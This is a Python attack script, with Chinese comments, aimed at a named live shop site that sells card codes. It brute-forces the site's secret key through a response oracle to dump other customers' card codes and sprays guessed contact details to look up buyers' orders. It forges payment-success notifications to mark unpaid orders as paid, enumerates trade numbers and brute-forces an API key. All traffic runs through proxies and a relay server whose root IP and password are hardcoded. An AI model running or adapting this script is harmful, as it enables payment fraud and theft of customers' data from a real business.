#!/usr/bin/env python3
"""xuxin66.top 订单/卡密深挖:
- SYS_KEY oracle via act=order (验证失败 vs 订单不存在/kminfo)
- 联系方式/取卡密码 query spray (HTML + ajax qq)
- epay_notify 伪造补单
- 历史 trade_no getshop 扫已付
- %61pi.php orders/search 密钥
"""
import hashlib
import json
import os
import re
import subprocess
import time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, urlencode, parse_qsl, unquote

TARGET = "xuxin66.top"
BASE = f"https://{TARGET}/shop"
JP = "124.248.67.170"
JP_PASS = "UzHlZQDUy7XP"
OUT = Path(f"/data/automation/results/{TARGET}/deep6_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
OUT.mkdir(parents=True, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
CK = "/tmp/xuxin66_d6_ck.txt"
SHOWORDER = re.compile(r"showOrder\((\d+)\s*,\s*['\"]([0-9a-f]{32})['\"]", re.I)


def log(m):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(OUT / "deep.log", "a").write(line + "\n")


def save(n, c):
    p = OUT / n
    if isinstance(c, (dict, list)):
        p.write_text(json.dumps(c, ensure_ascii=False, indent=2), encoding="utf-8")
    else:
        p.write_text(c if isinstance(c, str) else str(c), encoding="utf-8")
    return p


def qg():
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=30)
    env = open("/data/config/proxy.env").read()
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP}",
         "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env"],
        input=env.encode(), capture_output=True, timeout=20,
    )
    m = re.search(r"PROXY_URL=(.+)", env)
    return m.group(1).strip().strip("\"'") if m else ""


def jp(cmd, t=180):
    r = subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=12", f"root@{JP}", cmd],
        capture_output=True, timeout=t,
    )
    return (r.stdout or b"").decode("utf-8", "replace")


def try_json(s):
    s = (s or "").strip()
    if not s:
        return None
    try:
        return json.loads(s)
    except Exception:
        m = re.search(r"\{.*\}", s, re.S)
        if m:
            try:
                return json.loads(m.group(0))
            except Exception:
                return None
    return None


def compute_hashsalt(expr):
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr.strip()})"],
        capture_output=True, text=True, timeout=10,
    )
    if proc.returncode == 0 and proc.stdout.strip():
        return proc.stdout.strip()
    out = jp(f"node -e {json.dumps('console.log(' + expr.strip() + ')')}", t=15)
    return (out or "").strip()


def epay_sign(params, key):
    items = sorted(k for k in params if k != "sign" and params.get(k) not in (None, ""))
    s = "&".join(f"{k}={params[k]}" for k in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def load_keys(limit_smart=12000, limit_big=0):
    keys = [
        "xuxin66", "xuxin", "xuxin66.top", "xuxin66vip", "xuxin079", "xuxinzfb",
        "datou111", "datou333", "虚心", "zfb", "faka", "epay", "rainbow", "caihong",
        "123456", "888888", "666666", "111111", "000000", "admin", "password",
        "ttwl66", "ttwl", "1003", "Ykfaka999", "mckuai", "syskey", "apikey",
        "xuxin2024", "xuxin2025", "xuxin2026", "xuxin123", "xuxin888",
    ]
    for p, lim in [
        ("/tmp/query_pwd_list.txt", 600),
        ("/data/automation/results/youhui1998.top/deep_20260801_010500/syskey_smart.txt", limit_smart),
        ("/data/automation/results/youhui1998.top/deep_20260801_015500/syskey_big.txt", limit_big),
    ]:
        if not os.path.isfile(p) or lim <= 0:
            continue
        with open(p, errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= lim:
                    break
                k = line.strip()
                if 1 <= len(k) <= 64:
                    keys.append(k)
    # unique
    seen, out = set(), []
    for k in keys:
        if k not in seen:
            seen.add(k)
            out.append(k)
    return out


def scp_to_jp(local, remote):
    subprocess.run(
        ["sshpass", "-p", JP_PASS, "scp", "-o", "StrictHostKeyChecking=no", local, f"root@{JP}:{remote}"],
        capture_output=True, timeout=60,
    )


def warm():
    return jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
rm -f $CK
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/" -o /tmp/d6_home.html
wc -c /tmp/d6_home.html
python3 -c "import re;h=open('/tmp/d6_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')"
""", t=60)


findings = {
    "syskey": None,
    "kami": [],
    "query_hits": [],
    "notify_hits": [],
    "getshop_paid": [],
    "api_hits": [],
    "trades": [],
}


def main():
    log(f"OUT={OUT}")
    qg()
    w = warm()
    log("warm " + w.replace("\n", " | ")[:300])
    csrf = ""
    for line in w.strip().splitlines():
        if re.fullmatch(r"[a-f0-9]{32,}", line.strip()):
            csrf = line.strip()
    log(f"csrf={csrf[:24]}")

    # getcount
    gc_raw = jp(f"""source /data/config/proxy.env
UA='{UA}'; BASE='{BASE}'; CK={CK}
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -H "X-Requested-With: XMLHttpRequest" "$BASE/ajax.php?act=getcount"
echo
""", t=40)
    gc = try_json(gc_raw)
    save("getcount.json", gc or gc_raw)
    orders = int((gc or {}).get("orders") or 11240)
    log(f"orders≈{orders} gc={str(gc)[:160]}")

    keys = load_keys(limit_smart=8000, limit_big=0)
    save("keys_used.txt", "\n".join(keys))
    log(f"keys={len(keys)}")

    # ---------- [1] SYS_KEY oracle ----------
    log("[1] SYS_KEY oracle via act=order")
    oids = [orders, orders - 1, orders - 2, max(1, orders - 10), max(1, orders - 50), 10000, 1000, 1]
    oids = list(dict.fromkeys([int(x) for x in oids if x > 0]))
    # upload probe script to JP for speed
    probe = f'''#!/bin/bash
source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"; CSRF="{csrf}"
OID="$1"; KEYFILE="$2"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 12 -A "$UA" "$BASE/" -o /dev/null
n=0
while IFS= read -r key; do
  [ -z "$key" ] && continue
  sk=$(printf '%s' "${{OID}}${{key}}${{OID}}" | md5sum | awk '{{print $1}}')
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 6 -A "$UA" -e "$BASE/" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "id=$OID" --data-urlencode "skey=$sk" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=order" 2>/dev/null)
  n=$((n+1))
  if [ -n "$r" ] && ! echo "$r" | grep -q '验证失败'; then
    echo "HIT|$OID|$key|$sk|$r"
    exit 0
  fi
  if [ $((n % 80)) -eq 0 ]; then
    # soft refresh proxy every 80
    true
  fi
done < "$KEYFILE"
echo "MISS|$OID|$n"
'''
    open("/tmp/xuxin66_syskey_oracle.sh", "w").write(probe)
    scp_to_jp("/tmp/xuxin66_syskey_oracle.sh", "/data/tmp/xuxin66_syskey_oracle.sh")
    scp_to_jp(str(OUT / "keys_used.txt"), "/data/tmp/xuxin66_syskeys.txt")
    jp("chmod +x /data/tmp/xuxin66_syskey_oracle.sh")

    syskey = None
    for i, oid in enumerate(oids):
        if i and i % 2 == 0:
            qg()
        log(f"oracle oid={oid}")
        out = jp(f"bash /data/tmp/xuxin66_syskey_oracle.sh {oid} /data/tmp/xuxin66_syskeys.txt", t=900)
        save(f"oracle_oid_{oid}.txt", out or "")
        log((out or "")[:240])
        if out and "HIT|" in out:
            for line in out.splitlines():
                if line.startswith("HIT|"):
                    parts = line.split("|", 4)
                    if len(parts) >= 5:
                        syskey = parts[2]
                        findings["syskey"] = syskey
                        findings["kami"].append({"via": "syskey_oracle", "oid": parts[1], "key": syskey, "skey": parts[3], "body": parts[4][:4000]})
                        log(f"SYS_KEY HIT={syskey}")
                    break
        if syskey:
            break

    # if syskey found, dump recent orders
    if syskey:
        log("[1b] dump recent orders with SYS_KEY")
        dump_oids = list(range(orders, max(1, orders - 80), -1))
        dump_sh = f'''#!/bin/bash
source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"; CSRF="{csrf}"; KEY="{syskey}"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 12 -A "$UA" "$BASE/" -o /dev/null
for oid in {" ".join(str(x) for x in dump_oids)}; do
  sk=$(printf '%s' "${{oid}}${{KEY}}${{oid}}" | md5sum | awk '{{print $1}}')
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 6 -A "$UA" -e "$BASE/" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "id=$oid" --data-urlencode "skey=$sk" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=order" 2>/dev/null)
  echo "ORD|$oid|$r"
done
'''
        open("/tmp/xuxin66_dump_orders.sh", "w").write(dump_sh)
        scp_to_jp("/tmp/xuxin66_dump_orders.sh", "/data/tmp/xuxin66_dump_orders.sh")
        dump_out = jp("bash /data/tmp/xuxin66_dump_orders.sh", t=700)
        save("order_dump.txt", dump_out or "")
        for line in (dump_out or "").splitlines():
            if "kminfo" in line or '"code":0' in line:
                findings["kami"].append({"via": "dump", "line": line[:4000]})

    # ---------- [2] query contact spray ----------
    log("[2] query contact spray")
    contacts = [
        "123456", "888888", "666666", "111111", "000000", "123123", "5201314",
        "datou111", "datou333", "xuxin66", "xuxin", "admin", "test", "qq",
        "13800138000", "18888888888", "19999999999", "10000", "10086",
        "@xuxin66vip", "xuxin079",
    ]
    # extend from pwd list
    if os.path.isfile("/tmp/query_pwd_list.txt"):
        with open("/tmp/query_pwd_list.txt", errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= 200:
                    break
                v = line.strip()
                if 4 <= len(v) <= 32:
                    contacts.append(v)
    contacts = list(dict.fromkeys(contacts))
    save("contacts.txt", "\n".join(contacts))
    scp_to_jp(str(OUT / "contacts.txt"), "/data/tmp/xuxin66_contacts.txt")

    qg()
    q_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 20 -A "$UA" "$BASE/" -o /tmp/d6_home.html
CSRF=$(python3 -c "import re;h=open('/tmp/d6_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
n=0
while IFS= read -r c; do
  [ -z "$c" ] && continue
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$c")
  curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" "$BASE/?mod=query&data=$enc" -o /tmp/d6q.html
  if grep -q showOrder /tmp/d6q.html; then
    echo "HTMLHIT|$c"
    grep -oE "showOrder\\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\\)" /tmp/d6q.html | head -20
    cp /tmp/d6q.html /tmp/d6q_hit_$n.html
  fi
  # ajax qq
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/?mod=query" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "qq=$c" --data-urlencode "type=0" --data-urlencode "page=1" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=query" 2>/dev/null)
  if echo "$r" | grep -q '"code":0' && echo "$r" | grep -q '"id"'; then
    echo "AJAXHIT|$c|$r"
  fi
  n=$((n+1))
  if [ $((n % 40)) -eq 0 ]; then echo PROGRESS|$n; fi
done < /data/tmp/xuxin66_contacts.txt
echo QUERY_DONE|$n
''', t=1200)
    save("query_spray.txt", q_out or "")
    log("query " + (q_out or "")[:400])
    for line in (q_out or "").splitlines():
        if line.startswith("HTMLHIT|") or line.startswith("AJAXHIT|") or line.startswith("showOrder"):
            findings["query_hits"].append(line[:2000])
            m = SHOWORDER.search(line)
            if m:
                oid, skey = m.group(1), m.group(2)
                # fetch kami
                body = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" -e "$BASE/?mod=query" \
 -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "id={oid}" --data-urlencode "skey={skey}" --data-urlencode "csrf_token={csrf}" \
 "$BASE/ajax.php?act=order"
echo
''', t=40)
                findings["kami"].append({"via": "query_showOrder", "id": oid, "skey": skey, "body": (body or "")[:4000]})
                log(f"kami id={oid} {(body or '')[:160]}")
                # offline crack SYS_KEY from pair
                if not syskey:
                    for k in keys:
                        if hashlib.md5(f"{oid}{k}{oid}".encode()).hexdigest() == skey:
                            syskey = k
                            findings["syskey"] = k
                            log(f"SYS_KEY from query pair: {k}")
                            break

    # ---------- [3] create order + notify forgery ----------
    log("[3] pay + epay_notify")
    qg()
    buy_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
rm -f $CK
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 25 -A "$UA" "$BASE/" -o /tmp/d6_home.html
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 20 -A "$UA" -e "$BASE/" "$BASE/?mod=buy&cid=15&tid=168" -o /tmp/d6_buy.html
python3 -c "import re;h=open('/tmp/d6_buy.html',encoding='utf-8',errors='ignore').read();m=re.search(r'var hashsalt=(.+?);',h);open('/tmp/d6_hs.txt','w').write(m.group(1) if m else '');print('csrf',re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h).group(1) if re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h) else '')"
wc -c /tmp/d6_hs.txt
''', t=80)
    log(buy_out[:300])
    expr = jp("cat /tmp/d6_hs.txt").strip()
    hs = compute_hashsalt(expr) if expr else ""
    csrf_m = re.search(r"csrf\s+([a-f0-9]+)", buy_out)
    csrf2 = csrf_m.group(1) if csrf_m else csrf
    save("hashsalt.txt", hs)
    inputv = f"kami{datetime.now().strftime('%H%M%S')}"
    pay_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" -e "$BASE/?mod=buy&cid=15&tid=168" \
 -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "tid=168" --data-urlencode "inputvalue={inputv}" --data-urlencode "num=1" \
 --data-urlencode "hashsalt={hs}" --data-urlencode "csrf_token={csrf2}" \
 "$BASE/ajax.php?act=pay"
echo
''', t=40)
    save("pay.json", pay_out or "")
    pj = try_json(pay_out)
    trade = (pj or {}).get("trade_no")
    log(f"trade={trade} input={inputv} pay={str(pj)[:200]}")
    if trade:
        findings["trades"].append(trade)
        # submit capture
        sub = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 15 -A "$UA" "$BASE/other/submit.php?type=alipay&orderid={trade}" -o /tmp/d6_sub.html
grep -oE 'https?://[^"\\'\\'' <>]+' /tmp/d6_sub.html | head -5
cat /tmp/d6_sub.html | tr '\\n' ' ' | head -c 2500; echo
''', t=40)
        save("submit.html", sub or "")
        # parse money/pid/sign
        url_m = re.search(r"https?://[^\s\"']+sign=[a-f0-9]+[^\s\"']*", sub or "")
        money, pid, sign = "9", "1003", ""
        if url_m:
            q = dict(parse_qsl(url_m.group(0).split("?", 1)[-1], keep_blank_values=True))
            money = q.get("money", money)
            pid = q.get("pid", pid)
            sign = q.get("sign", "")
            save("submit_params.json", q)
            log(f"submit pid={pid} money={money} sign={sign}")

        # notify with top keys (site epay key may differ from gateway key)
        notify_keys = keys[:1500]
        open(OUT / "notify_keys.txt", "w").write("\n".join(notify_keys))
        scp_to_jp(str(OUT / "notify_keys.txt"), "/data/tmp/xuxin66_notify_keys.txt")
        n_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
TRADE="{trade}"; MONEY="{money}"; PID="{pid}"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 12 -A "$UA" "$BASE/" -o /dev/null
n=0
while IFS= read -r key; do
  [ -z "$key" ] && continue
  # build sign in python for unicode safety
  sign=$(MONEY="$MONEY" TRADE="$TRADE" PID="$PID" KEY="$key" python3 - <<'PY'
import hashlib,os
p={{"pid":os.environ["PID"],"type":"alipay","out_trade_no":os.environ["TRADE"],"notify_url":"https://xuxin66.top/shop/other/epay_notify.php","return_url":"https://xuxin66.top/shop/other/epay_return.php","name":"test","money":os.environ["MONEY"],"trade_no":os.environ["TRADE"],"trade_status":"TRADE_SUCCESS"}}
items=sorted(k for k in p if p[k]!="")
s="&".join(f"{{k}}={{p[k]}}" for k in items)+os.environ["KEY"]
print(hashlib.md5(s.encode()).hexdigest())
PY
)
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 6 -A "$UA" -X POST \
    --data-urlencode "pid=$PID" --data-urlencode "type=alipay" \
    --data-urlencode "out_trade_no=$TRADE" --data-urlencode "trade_no=$TRADE" \
    --data-urlencode "notify_url=https://xuxin66.top/shop/other/epay_notify.php" \
    --data-urlencode "return_url=https://xuxin66.top/shop/other/epay_return.php" \
    --data-urlencode "name=test" --data-urlencode "money=$MONEY" \
    --data-urlencode "trade_status=TRADE_SUCCESS" --data-urlencode "sign=$sign" \
    --data-urlencode "sign_type=MD5" \
    "$BASE/other/epay_notify.php" 2>/dev/null)
  n=$((n+1))
  if [ -n "$r" ] && [ "$r" != "error" ] && [ "$r" != "fail" ] && [ "$r" != "FAIL" ]; then
    echo "NOTIFYHIT|$key|$r"
  fi
  if [ $((n % 100)) -eq 0 ]; then echo NPROG|$n; fi
done < /data/tmp/xuxin66_notify_keys.txt
# check getshop after
gs=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" "$BASE/other/getshop.php?trade_no=$TRADE")
echo "GS|$gs"
# query by input
enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote('{inputv}'))")
curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 10 -A "$UA" "$BASE/?mod=query&data=$enc" -o /tmp/d6q2.html
if grep -q showOrder /tmp/d6q2.html; then echo "PAIDQUERYHIT|{inputv}"; grep -oE "showOrder\\([^)]+\\)" /tmp/d6q2.html | head; fi
echo NOTIFY_DONE|$n
''', t=900)
        save("notify_try.txt", n_out or "")
        log("notify " + (n_out or "")[:400])
        for line in (n_out or "").splitlines():
            if "NOTIFYHIT|" in line or "PAIDQUERYHIT|" in line:
                findings["notify_hits"].append(line[:1000])
            if line.startswith("GS|") and "未付款" not in line and len(line) > 10:
                findings["getshop_paid"].append(line[:2000])

    # ---------- [4] historical trade_no getshop (recent window) ----------
    log("[4] trade_no getshop recent window")
    qg()
    # generate candidates: last 2 days, sample minutes, random 3-digit suffix
    now = datetime.now()
    cands = []
    for day_off in range(0, 3):
        day = now - timedelta(days=day_off)
        for hour in range(0, 24, 1):
            for minute in (0, 15, 30, 45):
                for suf in (111, 222, 333, 444, 555, 666, 777, 888, 999, 123, 321, 520, 888):
                    ts = day.replace(hour=hour % 24, minute=minute, second=0, microsecond=0)
                    # also try with varied seconds
                    for sec in (0, 30):
                        t2 = ts.replace(second=sec)
                        cands.append(t2.strftime("%Y%m%d%H%M%S") + f"{suf:03d}"[-3:])
    # denser around known trade time 0644-0646
    base_known = datetime(2026, 8, 3, 6, 44, 0)
    for off in range(-120, 121):
        t = base_known + timedelta(seconds=off)
        for suf in range(100, 1000, 37):
            cands.append(t.strftime("%Y%m%d%H%M%S") + f"{suf:03d}")
    cands = list(dict.fromkeys(cands))[:6000]
    save("trade_cands.txt", "\n".join(cands))
    scp_to_jp(str(OUT / "trade_cands.txt"), "/data/tmp/xuxin66_tn6.txt")
    gs_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 15 -A "$UA" "$BASE/" -o /dev/null
n=0; hits=0
while IFS= read -r tn; do
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 4 -A "$UA" "$BASE/other/getshop.php?trade_no=$tn" 2>/dev/null)
  n=$((n+1))
  if [ -n "$r" ] && ! echo "$r" | grep -q '未付款' && ! echo "$r" | grep -q '订单不存在' && [ "$r" != "null" ]; then
    # interesting if code!=-1 or contains km/card
    if echo "$r" | grep -Eq '"code":0|卡密|km|kminfo|password|secret'; then
      echo "GSHIT|$tn|$r"
      hits=$((hits+1))
    elif ! echo "$r" | grep -q '"code":-1'; then
      echo "GSOTHER|$tn|$r"
    fi
  fi
  if [ $((n % 200)) -eq 0 ]; then echo GSPROG|$n|$hits; fi
done < /data/tmp/xuxin66_tn6.txt
echo GSDONE|$n|$hits
''', t=1200)
    save("getshop_scan.txt", gs_out or "")
    log("getshop " + (gs_out or "")[:400])
    for line in (gs_out or "").splitlines():
        if line.startswith("GSHIT|") or line.startswith("GSOTHER|"):
            findings["getshop_paid"].append(line[:2000])

    # ---------- [5] API key focused ----------
    log("[5] api key focused")
    qg()
    api_keys = keys[:2000]
    open(OUT / "api_keys.txt", "w").write("\n".join(api_keys))
    scp_to_jp(str(OUT / "api_keys.txt"), "/data/tmp/xuxin66_api_keys.txt")
    api_out = jp(f'''source /data/config/proxy.env
UA="{UA}"; BASE="{BASE}"; CK="{CK}"
API="%61pi.php"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 12 -A "$UA" "$BASE/" -o /dev/null
n=0
while IFS= read -r k; do
  [ -z "$k" ] && continue
  ek=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$k")
  r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 4 -A "$UA" "$BASE/$API?act=orders&limit=3&key=$ek" 2>/dev/null)
  n=$((n+1))
  if [ -n "$r" ] && ! echo "$r" | grep -q 'API对接密钥错误' && ! echo "$r" | grep -q '确保各项不能为空' && ! echo "$r" | grep -q '请提供用户登录'; then
    echo "APIHIT|$k|$r"
  fi
  if [ $((n % 150)) -eq 0 ]; then echo APIPROG|$n; fi
done < /data/tmp/xuxin66_api_keys.txt
echo APIDONE|$n
''', t=900)
    save("api_try.txt", api_out or "")
    log("api " + (api_out or "")[:300])
    for line in (api_out or "").splitlines():
        if line.startswith("APIHIT|"):
            findings["api_hits"].append(line[:2000])

    # summary
    save("FINDINGS.json", findings)
    md = [
        f"# xuxin66.top 订单/卡密深挖 v6",
        f"",
        f"- 目录: {OUT}",
        f"- orders≈{orders}",
        f"- SYS_KEY: `{findings['syskey']}`",
        f"- kami条数: {len(findings['kami'])}",
        f"- query命中: {len(findings['query_hits'])}",
        f"- notify命中: {len(findings['notify_hits'])}",
        f"- getshop已付/异常: {len(findings['getshop_paid'])}",
        f"- api命中: {len(findings['api_hits'])}",
        f"- 测试单: {', '.join(findings['trades'])}",
        f"",
        f"## 方法",
        f"1. `skey=md5(id+SYS_KEY+id)` oracle（响应非验证失败即中）",
        f"2. `/?mod=query&data=` + `ajax.php?act=query` 联系方式喷洒",
        f"3. `other/epay_notify.php` 签名伪造补单",
        f"4. `other/getshop.php?trade_no=` 历史单",
        f"5. `%61pi.php?act=orders&key=`",
    ]
    if findings["kami"]:
        md.append("\n## 卡密样本\n")
        for k in findings["kami"][:10]:
            md.append(f"- `{json.dumps(k, ensure_ascii=False)[:500]}`")
    save("SUMMARY.md", "\n".join(md))
    log("===== DONE =====")
    print(open(OUT / "SUMMARY.md").read())


if __name__ == "__main__":
    main()
